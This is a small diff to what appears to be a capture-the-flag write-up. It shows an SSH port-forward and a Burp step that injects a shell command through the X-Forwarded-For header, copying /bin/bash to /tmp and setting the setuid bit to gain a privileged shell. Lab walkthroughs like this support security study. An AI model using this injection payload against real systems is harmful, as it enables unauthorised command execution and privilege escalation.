@@ -105,4 +105,4 @@ ssh -L 8081:localhost:8080 kitty@10.10.39.28
 Use the password 'sleep' to trig "SQL Injection detected. This incident will be logged"
 
 In burp:
-X-Forwarded-For: && cp /bin/bash /tmp/kikou && chmod +s /tmp/kikou
+X-Forwarded-For: && cp /bin/bash /tmp/kikou && chmod +s /tmp/kikou #
